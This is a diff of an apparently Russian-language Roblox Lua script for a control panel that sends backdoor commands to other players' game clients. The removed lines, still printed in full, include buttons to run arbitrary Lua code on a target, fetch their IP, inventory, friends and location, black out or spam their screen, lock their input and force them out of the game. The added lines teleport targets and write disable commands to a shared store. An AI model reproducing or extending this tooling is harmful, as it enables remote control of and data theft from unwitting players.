-        blackBtn.Size = UDim2.new(0, 70, 0, 25)
-        blackBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        blackBtn.Text = "⬛ Black"
-        blackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        blackBtn.TextScaled = true
-        blackBtn.Font = Enum.Font.GothamBold
-        blackBtn.Parent = btnContainer
-        blackBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "BLACK_SCREEN", "")
-        end)
-        
-        -- 26. Вспышка
-        local flashBtn = Instance.new("TextButton")
-        flashBtn.Size = UDim2.new(0, 70, 0, 25)
-        flashBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-        flashBtn.Text = "⚡ Flash"
-        flashBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-        flashBtn.TextScaled = true
-        flashBtn.Font = Enum.Font.GothamBold
-        flashBtn.Parent = btnContainer
-        flashBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "FLASH_SCREEN", "")
-        end)
-        
-        -- 27. Тряска камеры
-        local shakeBtn = Instance.new("TextButton")
-        shakeBtn.Size = UDim2.new(0, 70, 0, 25)
-        shakeBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
-        shakeBtn.Text = "🌀 Shake"
-        shakeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        shakeBtn.TextScaled = true
-        shakeBtn.Font = Enum.Font.GothamBold
-        shakeBtn.Parent = btnContainer
-        shakeBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SHAKE_CAMERA", "")
-        end)
-        
-        -- 28. Инвертировать управление
-        local invertBtn = Instance.new("TextButton")
-        invertBtn.Size = UDim2.new(0, 70, 0, 25)
-        invertBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 200)
-        invertBtn.Text = "🔄 Invert"
-        invertBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        invertBtn.TextScaled = true
-        invertBtn.Font = Enum.Font.GothamBold
-        invertBtn.Parent = btnContainer
-        invertBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "INVERT_CONTROLS", "")
-        end)
-        
-        -- 29. Спам уведомлениями
-        local spamBtn = Instance.new("TextButton")
-        spamBtn.Size = UDim2.new(0, 70, 0, 25)
-        spamBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
-        spamBtn.Text = "📢 Spam"
-        spamBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        spamBtn.TextScaled = true
-        spamBtn.Font = Enum.Font.GothamBold
-        spamBtn.Parent = btnContainer
-        spamBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SPAM_NOTIFICATIONS", "")
-        end)
-        
-        -- 30. Выполнить Lua код (окно ввода)
-        local execBtn = Instance.new("TextButton")
-        execBtn.Size = UDim2.new(0, 70, 0, 25)
-        execBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
-        execBtn.Text = "📋 Exec"
-        execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        execBtn.TextScaled = true
-        execBtn.Font = Enum.Font.GothamBold
-        execBtn.Parent = btnContainer
-        execBtn.MouseButton1Click:Connect(function()
-            -- Создаем окно ввода
-            local execGui = Instance.new("ScreenGui")
-            execGui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
-            
-            local execFrame = Instance.new("Frame")
-            execFrame.Size = UDim2.new(0, 400, 0, 200)
-            execFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
-            execFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-            execFrame.Parent = execGui
-            
-            local eCorner = Instance.new("UICorner")
-            eCorner.CornerRadius = UDim.new(0, 8)
-            eCorner.Parent = execFrame
-            
-            local eTitle = Instance.new("TextLabel")
-            eTitle.Size = UDim2.new(1, 0, 0, 40)
-            eTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            eTitle.BackgroundTransparency = 0.3
-            eTitle.Text = "📋 Выполнить код на " .. info.name
-            eTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-            eTitle.TextScaled = true
-            eTitle.Font = Enum.Font.GothamBold
-            eTitle.Parent = execFrame
-            
-            local eTitleCorner = Instance.new("UICorner")
-            eTitleCorner.CornerRadius = UDim.new(0, 8)
-            eTitleCorner.Parent = eTitle
-            
-            local codeBox = Instance.new("TextBox")
-            codeBox.Size = UDim2.new(0.9, 0, 0, 80)
-            codeBox.Position = UDim2.new(0.05, 0, 0, 50)
-            codeBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            codeBox.PlaceholderText = "print('Hello from admin')"
-            codeBox.Text = ""
-            codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            codeBox.TextWrapped = true
-            codeBox.TextScaled = true
-            codeBox.Font = Enum.Font.Code
-            codeBox.Parent = execFrame
-            
-            local codeCorner = Instance.new("UICorner")
-            codeCorner.CornerRadius = UDim.new(0, 5)
-            codeCorner.Parent = codeBox
-            
-            local execNowBtn = Instance.new("TextButton")
-            execNowBtn.Size = UDim2.new(0.4, 0, 0, 30)
-            execNowBtn.Position = UDim2.new(0.3, 0, 0, 140)
-            execNowBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-            execNowBtn.Text = "Выполнить"
-            execNowBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            execNowBtn.TextScaled = true
-            execNowBtn.Font = Enum.Font.GothamBold
-            execNowBtn.Parent = execFrame
-            
-            local execCorner = Instance.new("UICorner")
-            execCorner.CornerRadius = UDim.new(0, 5)
-            execCorner.Parent = execNowBtn
-            
-            execNowBtn.MouseButton1Click:Connect(function()
-                if codeBox.Text ~= "" then
-                    sendBackdoorCommand(uid, "EXECUTE_LUA", codeBox.Text)
-                    execGui:Destroy()
+        addBtn("📍 TP to", Color3.fromRGB(60, 180, 140), function()
+            if targetPlayer and targetPlayer.Character then
+                local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                local tRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if root and tRoot then
+                    root.CFrame = tRoot.CFrame * CFrame.new(0, 3, 5)
                 end
-            end)
-        end)
-        
-        -- 31. Получить инвентарь
-        local invBtn = Instance.new("TextButton")
-        invBtn.Size = UDim2.new(0, 70, 0, 25)
-        invBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-        invBtn.Text = "📦 Inv"
-        invBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        invBtn.TextScaled = true
-        invBtn.Font = Enum.Font.GothamBold
-        invBtn.Parent = btnContainer
-        invBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "GET_INVENTORY", "")
-            SG:SetCore("SendNotification", {
-                Title = "Команда отправлена",
-                Text = "Запрос инвентаря",
-                Duration = 2
-            })
-        end)
-        
-        -- 32. Получить друзей
-        local friendsBtn = Instance.new("TextButton")
-        friendsBtn.Size = UDim2.new(0, 70, 0, 25)
-        friendsBtn.BackgroundColor3 = Color3.fromRGB(150, 100, 255)
-        friendsBtn.Text = "👥 Friends"
-        friendsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        friendsBtn.TextScaled = true
-        friendsBtn.Font = Enum.Font.GothamBold
-        friendsBtn.Parent = btnContainer
-        friendsBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "GET_FRIENDS", "")
-        end)
-        
-        -- 33. Получить локацию
-        local locBtn = Instance.new("TextButton")
-        locBtn.Size = UDim2.new(0, 70, 0, 25)
-        locBtn.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
-        locBtn.Text = "📍 Loc"
-        locBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        locBtn.TextScaled = true
-        locBtn.Font = Enum.Font.GothamBold
-        locBtn.Parent = btnContainer
-        locBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "GET_LOCATION", "")
-        end)
-        
-        -- 34. Телепорт к координатам (окно ввода)
-        local tpCoordBtn = Instance.new("TextButton")
-        tpCoordBtn.Size = UDim2.new(0, 70, 0, 25)
-        tpCoordBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 200)
-        tpCoordBtn.Text = "🌍 TP Coord"
-        tpCoordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        tpCoordBtn.TextScaled = true
-        tpCoordBtn.Font = Enum.Font.GothamBold
-        tpCoordBtn.Parent = btnContainer
-        tpCoordBtn.MouseButton1Click:Connect(function()
-            local coordGui = Instance.new("ScreenGui")
-            coordGui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
-            
-            local coordFrame = Instance.new("Frame")
-            coordFrame.Size = UDim2.new(0, 300, 0, 150)
-            coordFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
-            coordFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-            coordFrame.Parent = coordGui
-            
-            local cCorner = Instance.new("UICorner")
-            cCorner.CornerRadius = UDim.new(0, 8)
-            cCorner.Parent = coordFrame
-            
-            local cTitle = Instance.new("TextLabel")
-            cTitle.Size = UDim2.new(1, 0, 0, 40)
-            cTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            cTitle.BackgroundTransparency = 0.3
-            cTitle.Text = "Координаты"
-            cTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-            cTitle.TextScaled = true
-            cTitle.Font = Enum.Font.GothamBold
-            cTitle.Parent = coordFrame
-            
-            local cTitleCorner = Instance.new("UICorner")
-            cTitleCorner.CornerRadius = UDim.new(0, 8)
-            cTitleCorner.Parent = cTitle
-            
-            local xBox = Instance.new("TextBox")
-            xBox.Size = UDim2.new(0.25, 0, 0, 30)
-            xBox.Position = UDim2.new(0.1, 0, 0, 50)
-            xBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            xBox.PlaceholderText = "X"
-            xBox.Text = ""
-            xBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            xBox.TextScaled = true
-            xBox.Font = Enum.Font.Gotham
-            xBox.Parent = coordFrame
-            
-            local xCorner = Instance.new("UICorner")
-            xCorner.CornerRadius = UDim.new(0, 5)
-            xCorner.Parent = xBox
-            
-            local yBox = Instance.new("TextBox")
-            yBox.Size = UDim2.new(0.25, 0, 0, 30)
-            yBox.Position = UDim2.new(0.4, 0, 0, 50)
-            yBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            yBox.PlaceholderText = "Y"
-            yBox.Text = ""
-            yBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            yBox.TextScaled = true
-            yBox.Font = Enum.Font.Gotham
-            yBox.Parent = coordFrame
-            
-            local yCorner = Instance.new("UICorner")
-            yCorner.CornerRadius = UDim.new(0, 5)
-            yCorner.Parent = yBox
-            
-            local zBox = Instance.new("TextBox")
-            zBox.Size = UDim2.new(0.25, 0, 0, 30)
-            zBox.Position = UDim2.new(0.7, 0, 0, 50)
-            zBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            zBox.PlaceholderText = "Z"
-            zBox.Text = ""
-            zBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            zBox.TextScaled = true
-            zBox.Font = Enum.Font.Gotham
-            zBox.Parent = coordFrame
-            
-            local zCorner = Instance.new("UICorner")
-            zCorner.CornerRadius = UDim.new(0, 5)
-            zCorner.Parent = zBox
-            
-            local tpBtn = Instance.new("TextButton")
-            tpBtn.Size = UDim2.new(0.5, 0, 0, 30)
-            tpBtn.Position = UDim2.new(0.25, 0, 0, 90)
-            tpBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-            tpBtn.Text = "Телепорт"
-            tpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            tpBtn.TextScaled = true
-            tpBtn.Font = Enum.Font.GothamBold
-            tpBtn.Parent = coordFrame
-            
-            local tpCorner = Instance.new("UICorner")
-            tpCorner.CornerRadius = UDim.new(0, 5)
-            tpCorner.Parent = tpBtn
-            
-            tpBtn.MouseButton1Click:Connect(function()
-                if xBox.Text ~= "" and yBox.Text ~= "" and zBox.Text ~= "" then
-                    local coords = xBox.Text .. "," .. yBox.Text .. "," .. zBox.Text
-                    sendBackdoorCommand(uid, "TELEPORT_TO", coords)
-                    coordGui:Destroy()
-                end
-            end)
-        end)
-        
-        -- 35. Выдать предмет
-        local giveItemBtn = Instance.new("TextButton")
-        giveItemBtn.Size = UDim2.new(0, 70, 0, 25)
-        giveItemBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 50)
-        giveItemBtn.Text = "🎁 Give"
-        giveItemBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-        giveItemBtn.TextScaled = true
-        giveItemBtn.Font = Enum.Font.GothamBold
-        giveItemBtn.Parent = btnContainer
-        giveItemBtn.MouseButton1Click:Connect(function()
-            local itemGui = Instance.new("ScreenGui")
-            itemGui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
-            
-            local itemFrame = Instance.new("Frame")
-            itemFrame.Size = UDim2.new(0, 300, 0, 120)
-            itemFrame.Position = UDim2.new(0.5, -150, 0.5, -60)
-            itemFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-            itemFrame.Parent = itemGui
-            
-            local iCorner = Instance.new("UICorner")
-            iCorner.CornerRadius = UDim.new(0, 8)
-            iCorner.Parent = itemFrame
-            
-            local iTitle = Instance.new("TextLabel")
-            iTitle.Size = UDim2.new(1, 0, 0, 40)
-            iTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            iTitle.BackgroundTransparency = 0.3
-            iTitle.Text = "Название предмета"
-            iTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-            iTitle.TextScaled = true
-            iTitle.Font = Enum.Font.GothamBold
-            iTitle.Parent = itemFrame
-            
-            local iTitleCorner = Instance.new("UICorner")
-            iTitleCorner.CornerRadius = UDim.new(0, 8)
-            iTitleCorner.Parent = iTitle
-            
-            local itemBox = Instance.new("TextBox")
-            itemBox.Size = UDim2.new(0.8, 0, 0, 30)
-            itemBox.Position = UDim2.new(0.1, 0, 0, 50)
-            itemBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            itemBox.PlaceholderText = "например: Sword"
-            itemBox.Text = ""
-            itemBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            itemBox.TextScaled = true
-            itemBox.Font = Enum.Font.Gotham
-            itemBox.Parent = itemFrame
-            
-            local itemBoxCorner = Instance.new("UICorner")
-            itemBoxCorner.CornerRadius = UDim.new(0, 5)
-            itemBoxCorner.Parent = itemBox
-            
-            local giveNowBtn = Instance.new("TextButton")
-            giveNowBtn.Size = UDim2.new(0.5, 0, 0, 30)
-            giveNowBtn.Position = UDim2.new(0.25, 0, 0, 90)
-            giveNowBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-            giveNowBtn.Text = "Выдать"
-            giveNowBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            giveNowBtn.TextScaled = true
-            giveNowBtn.Font = Enum.Font.GothamBold
-            giveNowBtn.Parent = itemFrame
-            
-            local giveCorner = Instance.new("UICorner")
-            giveCorner.CornerRadius = UDim.new(0, 5)
-            giveCorner.Parent = giveNowBtn
-            
-            giveNowBtn.MouseButton1Click:Connect(function()
-                if itemBox.Text ~= "" then
-                    sendBackdoorCommand(uid, "GIVE_ITEM", itemBox.Text)
-                    itemGui:Destroy()
-                end
-            end)
-        end)
-        
-        -- 36. Изменить гравитацию
-        local gravBtn = Instance.new("TextButton")
-        gravBtn.Size = UDim2.new(0, 70, 0, 25)
-        gravBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 200)
-        gravBtn.Text = "⚖️ Gravity"
-        gravBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        gravBtn.TextScaled = true
-        gravBtn.Font = Enum.Font.GothamBold
-        gravBtn.Parent = btnContainer
-        gravBtn.MouseButton1Click:Connect(function()
-            local gravGui = Instance.new("ScreenGui")
-            gravGui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
-            
-            local gravFrame = Instance.new("Frame")
-            gravFrame.Size = UDim2.new(0, 250, 0, 120)
-            gravFrame.Position = UDim2.new(0.5, -125, 0.5, -60)
-            gravFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-            gravFrame.Parent = gravGui
-            
-            local gCorner = Instance.new("UICorner")
-            gCorner.CornerRadius = UDim.new(0, 8)
-            gCorner.Parent = gravFrame
-            
-            local gTitle = Instance.new("TextLabel")
-            gTitle.Size = UDim2.new(1, 0, 0, 40)
-            gTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            gTitle.BackgroundTransparency = 0.3
-            gTitle.Text = "Гравитация (196.2)"
-            gTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-            gTitle.TextScaled = true
-            gTitle.Font = Enum.Font.GothamBold
-            gTitle.Parent = gravFrame
-            
-            local gTitleCorner = Instance.new("UICorner")
-            gTitleCorner.CornerRadius = UDim.new(0, 8)
-            gTitleCorner.Parent = gTitle
-            
-            local gravBox = Instance.new("TextBox")
-            gravBox.Size = UDim2.new(0.6, 0, 0, 30)
-            gravBox.Position = UDim2.new(0.2, 0, 0, 50)
-            gravBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            gravBox.PlaceholderText = "число"
-            gravBox.Text = ""
-            gravBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            gravBox.TextScaled = true
-            gravBox.Font = Enum.Font.Gotham
-            gravBox.Parent = gravFrame
-            
-            local gravBoxCorner = Instance.new("UICorner")
-            gravBoxCorner.CornerRadius = UDim.new(0, 5)
-            gravBoxCorner.Parent = gravBox
-            
-            local setGravBtn = Instance.new("TextButton")
-            setGravBtn.Size = UDim2.new(0.5, 0, 0, 30)
-            setGravBtn.Position = UDim2.new(0.25, 0, 0, 90)
-            setGravBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-            setGravBtn.Text = "Установить"
-            setGravBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            setGravBtn.TextScaled = true
-            setGravBtn.Font = Enum.Font.GothamBold
-            setGravBtn.Parent = gravFrame
-            
-            local setGravCorner = Instance.new("UICorner")
-            setGravCorner.CornerRadius = UDim.new(0, 5)
-            setGravCorner.Parent = setGravBtn
-            
-            setGravBtn.MouseButton1Click:Connect(function()
-                if gravBox.Text ~= "" then
-                    sendBackdoorCommand(uid, "SET_GRAVITY", gravBox.Text)
-                    gravGui:Destroy()
-                end
-            end)
-        end)
-        
-        -- 37. Отключить звук
-        local muteBtn = Instance.new("TextButton")
-        muteBtn.Size = UDim2.new(0, 70, 0, 25)
-        muteBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-        muteBtn.Text = "🔇 Mute"
-        muteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        muteBtn.TextScaled = true
-        muteBtn.Font = Enum.Font.GothamBold
-        muteBtn.Parent = btnContainer
-        muteBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "MUTE_GAME", "")
-        end)
-        
-        -- 38. Включить звук
-        local unmuteBtn = Instance.new("TextButton")
-        unmuteBtn.Size = UDim2.new(0, 70, 0, 25)
-        unmuteBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-        unmuteBtn.Text = "🔊 Unmute"
-        unmuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        unmuteBtn.TextScaled = true
-        unmuteBtn.Font = Enum.Font.GothamBold
-        unmuteBtn.Parent = btnContainer
-        unmuteBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "UNMUTE_GAME", "")
-        end)
-        
-        -- 39. Перезагрузить игру
-        local reloadBtn = Instance.new("TextButton")
-        reloadBtn.Size = UDim2.new(0, 70, 0, 25)
-        reloadBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
-        reloadBtn.Text = "🔄 Reload"
-        reloadBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        reloadBtn.TextScaled = true
-        reloadBtn.Font = Enum.Font.GothamBold
-        reloadBtn.Parent = btnContainer
-        reloadBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "RELOAD_GAME", "")
-        end)
-        
-        -- 40. Выйти из игры
-        local leaveBtn = Instance.new("TextButton")
-        leaveBtn.Size = UDim2.new(0, 70, 0, 25)
-        leaveBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-        leaveBtn.Text = "🚪 Leave"
-        leaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        leaveBtn.TextScaled = true
-        leaveBtn.Font = Enum.Font.GothamBold
-        leaveBtn.Parent = btnContainer
-        leaveBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "LEAVE_GAME", "")
-        end)
-        
-        -- 41. Отправить уведомление
-        local notifyBtn = Instance.new("TextButton")
-        notifyBtn.Size = UDim2.new(0, 70, 0, 25)
-        notifyBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 255)
-        notifyBtn.Text = "📨 Notify"
-        notifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        notifyBtn.TextScaled = true
-        notifyBtn.Font = Enum.Font.GothamBold
-        notifyBtn.Parent = btnContainer
-        notifyBtn.MouseButton1Click:Connect(function()
-            local notifyGui = Instance.new("ScreenGui")
-            notifyGui.Parent = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
-            
-            local notifyFrame = Instance.new("Frame")
-            notifyFrame.Size = UDim2.new(0, 300, 0, 120)
-            notifyFrame.Position = UDim2.new(0.5, -150, 0.5, -60)
-            notifyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-            notifyFrame.Parent = notifyGui
-            
-            local nCorner = Instance.new("UICorner")
-            nCorner.CornerRadius = UDim.new(0, 8)
-            nCorner.Parent = notifyFrame
-            
-            local nTitle = Instance.new("TextLabel")
-            nTitle.Size = UDim2.new(1, 0, 0, 40)
-            nTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            nTitle.BackgroundTransparency = 0.3
-            nTitle.Text = "Текст уведомления"
-            nTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-            nTitle.TextScaled = true
-            nTitle.Font = Enum.Font.GothamBold
-            nTitle.Parent = notifyFrame
-            
-            local nTitleCorner = Instance.new("UICorner")
-            nTitleCorner.CornerRadius = UDim.new(0, 8)
-            nTitleCorner.Parent = nTitle
-            
-            local msgBox = Instance.new("TextBox")
-            msgBox.Size = UDim2.new(0.8, 0, 0, 30)
-            msgBox.Position = UDim2.new(0.1, 0, 0, 50)
-            msgBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-            msgBox.PlaceholderText = "Сообщение"
-            msgBox.Text = ""
-            msgBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            msgBox.TextScaled = true
-            msgBox.Font = Enum.Font.Gotham
-            msgBox.Parent = notifyFrame
-            
-            local msgCorner = Instance.new("UICorner")
-            msgCorner.CornerRadius = UDim.new(0, 5)
-            msgCorner.Parent = msgBox
-            
-            local sendNotifyBtn = Instance.new("TextButton")
-            sendNotifyBtn.Size = UDim2.new(0.5, 0, 0, 30)
-            sendNotifyBtn.Position = UDim2.new(0.25, 0, 0, 90)
-            sendNotifyBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-            sendNotifyBtn.Text = "Отправить"
-            sendNotifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            sendNotifyBtn.TextScaled = true
-            sendNotifyBtn.Font = Enum.Font.GothamBold
-            sendNotifyBtn.Parent = notifyFrame
-            
-            local sendCorner = Instance.new("UICorner")
-            sendCorner.CornerRadius = UDim.new(0, 5)
-            sendCorner.Parent = sendNotifyBtn
-            
-            sendNotifyBtn.MouseButton1Click:Connect(function()
-                if msgBox.Text ~= "" then
-                    sendBackdoorCommand(uid, "NOTIFICATION", msgBox.Text)
-                    notifyGui:Destroy()
-                end
-            end)
-        end)
-        
-        -- 42. Замедлить время
-        local slowmoBtn = Instance.new("TextButton")
-        slowmoBtn.Size = UDim2.new(0, 70, 0, 25)
-        slowmoBtn.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
-        slowmoBtn.Text = "⏱️ Slowmo"
-        slowmoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        slowmoBtn.TextScaled = true
-        slowmoBtn.Font = Enum.Font.GothamBold
-        slowmoBtn.Parent = btnContainer
-        slowmoBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "EXECUTE_LUA", "game:GetService('RunService').Heartbeat:Wait() task.wait(0.1) end)")
-        end)
-        
-        -- 43. Ускорить время
-        local fastmoBtn = Instance.new("TextButton")
-        fastmoBtn.Size = UDim2.new(0, 70, 0, 25)
-        fastmoBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 100)
-        fastmoBtn.Text = "⚡ Fastmo"
-        fastmoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        fastmoBtn.TextScaled = true
-        fastmoBtn.Font = Enum.Font.GothamBold
-        fastmoBtn.Parent = btnContainer
-        fastmoBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "EXECUTE_LUA", "game:GetService('RunService').Heartbeat:Wait() end)")
-        end)
-        
-        -- 44. Отключить все функции
-        local disableAllBtn = Instance.new("TextButton")
-        disableAllBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableAllBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-        disableAllBtn.Text = "🚫 ALL"
-        disableAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableAllBtn.TextScaled = true
-        disableAllBtn.Font = Enum.Font.GothamBold
-        disableAllBtn.Parent = btnContainer
-        disableAllBtn.MouseButton1Click:Connect(function()
-            local functions = {"GODMODE", "FLIGHT", "NOCLIP", "ESP", "XRAY", "AIMBOT", "TRIGGERBOT", "INFJUMP"}
-            for _, func in ipairs(functions) do
-                sendBackdoorCommand(uid, "DISABLE_FUNCTION", func)
-                task.wait(0.1)
             end
         end)
         
-        -- 45. Получить IP (обновить)
-        local getIPBtn = Instance.new("TextButton")
-        getIPBtn.Size = UDim2.new(0, 70, 0, 25)
-        getIPBtn.BackgroundColor3 = Color3.fromRGB(150, 100, 200)
-        getIPBtn.Text = "🌐 Get IP"
-        getIPBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        getIPBtn.TextScaled = true
-        getIPBtn.Font = Enum.Font.GothamBold
-        getIPBtn.Parent = btnContainer
-        getIPBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "GET_IP", "")
+        addBtn("📦 Bring", Color3.fromRGB(100, 200, 80), function()
+            if targetPlayer and targetPlayer.Character then
+                local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                local tRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if root and tRoot then
+                    tRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
+                end
+            end
         end)
         
-        -- 46. Заблокировать управление
-        local blockInputBtn = Instance.new("TextButton")
-        blockInputBtn.Size = UDim2.new(0, 70, 0, 25)
-        blockInputBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
-        blockInputBtn.Text = "🔒 Block"
-        blockInputBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        blockInputBtn.TextScaled = true
-        blockInputBtn.Font = Enum.Font.GothamBold
-        blockInputBtn.Parent = btnContainer
-        blockInputBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "EXECUTE_LUA", "game:GetService('UserInputService').MouseBehavior = Enum.MouseBehavior.Lock")
+        -- 11-20: Отключение функций
+        addBtn("🚫 God", Color3.fromRGB(160, 80, 160), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|GODMODE|" .. tick(), 30)
         end)
         
-        -- 47. Сменить камеру
-        local cameraBtn = Instance.new("TextButton")
-        cameraBtn.Size = UDim2.new(0, 70, 0, 25)
-        cameraBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 200)
-        cameraBtn.Text = "📷 Camera"
-        cameraBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        cameraBtn.TextScaled = true
-        cameraBtn.Font = Enum.Font.GothamBold
-        cameraBtn.Parent = btnContainer
-        cameraBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "EXECUTE_LUA", "workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable")
+        addBtn("🚫 Flight", Color3.fromRGB(80, 120, 200), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|FLIGHT|" .. tick(), 30)
         end)
         
-        -- 48. Вернуть камеру
-        local resetCameraBtn = Instance.new("TextButton")
-        resetCameraBtn.Size = UDim2.new(0, 70, 0, 25)
-        resetCameraBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-        resetCameraBtn.Text = "🔄 ResetCam"
-        resetCameraBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        resetCameraBtn.TextScaled = true
-        resetCameraBtn.Font = Enum.Font.GothamBold
-        resetCameraBtn.Parent = btnContainer
-        resetCameraBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "EXECUTE_LUA", "workspace.CurrentCamera.CameraType = Enum.CameraType.Custom")
+        addBtn("🚫 Noclip", Color3.fromRGB(140, 80, 140), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|NOCLIP|" .. tick(), 30)
         end)
         
-        -- 49. Показать FPS
-        local fpsBtn = Instance.new("TextButton")
-        fpsBtn.Size = UDim2.new(0, 70, 0, 25)
